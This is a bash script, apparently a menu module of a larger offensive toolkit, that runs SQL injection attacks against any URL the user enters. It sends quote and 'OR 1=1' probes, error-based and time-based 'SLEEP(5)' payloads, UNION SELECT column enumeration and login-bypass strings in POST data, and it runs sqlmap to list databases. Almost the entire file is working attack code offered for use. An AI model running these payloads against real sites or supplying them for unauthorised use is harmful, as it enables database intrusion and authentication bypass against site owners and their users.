# NAME: SQL Injection
while true; do
    clear
    echo -e "${GRAY}┌─ SQL Injection ─────────────────────┐${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[1]${NC} ${GRAY}Basic SQLi Test${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[2]${NC} ${GRAY}Error-Based${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[3]${NC} ${GRAY}Time-Based${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[4]${NC} ${GRAY}Union-Based${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[5]${NC} ${GRAY}SQLMap Auto${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[6]${NC} ${GRAY}Login Bypass${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[0]${NC} ${GRAY}Back${NC}"
    echo -e "${GRAY}└─────────────────────────────────────┘${NC}"
    read -p "  $(t choose): " c
    case "$c" in
        1) read -p "  URL: " url; clear
           for p in "'" "\"" "1'" "1 OR 1=1" "admin'--"; do
             code=$(curl -s -o /dev/null -w "%{http_code}" "$url$p" 2>/dev/null)
             echo "  $p → HTTP $code"; done
           read -p "  $(t press_any)..." ;;
        2) read -p "  URL: " url; clear; curl -s "$url'" | grep -iE "sql|syntax|mysql|ora-|postgres" | head -10; read -p "  $(t press_any)..." ;;
        3) read -p "  URL: " url; clear; s=$(date +%s); curl -s "$url' AND SLEEP(5)-- -" >/dev/null; e=$(date +%s)
           echo "  Delay: $((e-s))s"; [ $((e-s)) -ge 5 ] && echo "  [+] Possible!"; read -p "  $(t press_any)..." ;;
        4) read -p "  URL: " url; clear
           for i in 1 2 3 4 5; do cols=$(printf ",%d" $(seq 1 $i) | cut -c2-)
             r=$(curl -s "$url' UNION SELECT $cols-- -" | head -c 100)
             [ -n "$r" ] && echo "  Try $i cols → len: ${#r}"; done
           read -p "  $(t press_any)..." ;;
        5) if ! command -v sqlmap >/dev/null; then show_install "sqlmap" "pip install sqlmap"; continue; fi
           read -p "  URL: " url; clear; sqlmap -u "$url" --batch --dbs; read -p "  $(t press_any)..." ;;
        6) read -p "  URL: " url; clear
           for p in "' OR '1'='1" "admin'--" "' OR 1=1--"; do
             code=$(curl -s -o /dev/null -w "%{http_code}" -d "user=admin&pass=$p" "$url" 2>/dev/null)
             echo "  $p → HTTP $code"; done
           read -p "  $(t press_any)..." ;;
        0) return ;;
    esac
done
